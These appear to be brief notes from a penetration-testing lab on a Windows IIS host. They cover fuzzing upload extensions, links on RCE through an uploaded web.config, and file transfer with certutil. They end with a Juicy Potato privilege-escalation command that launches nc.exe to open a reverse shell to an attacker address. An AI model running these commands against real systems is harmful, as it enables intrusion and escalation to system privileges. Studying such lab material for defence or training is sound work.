### Modifying the raft-small-extensions.txt wordlist from SecLists, removing the dot to avoid Burp from URL-encoding it
```
cp /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-extensions.txt .
sed -i 's/.//' raft-small-extensions.txt
```

### Google "iis config rce"
https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
https://soroush.secproject.com/blog/tag/unrestricted-file-upload/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config

### windows file transfter
https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/

`certutil` is available

## Priv
### So simple
`whoami /priv`

### Only worked payload 
https://github.com/ohpe/juicy-potato

### Googling how to use the correct payload
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

```
Get-Service # PSH
sc query    # CMD
# To get the clsid and replace it
https://github.com/ohpe/juicy-potato/tree/master/CLSID

JuicyPotato.exe  -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Windows\temp\nc.exe -e cmd.exe 10.10.x.x 6789" -t *
```
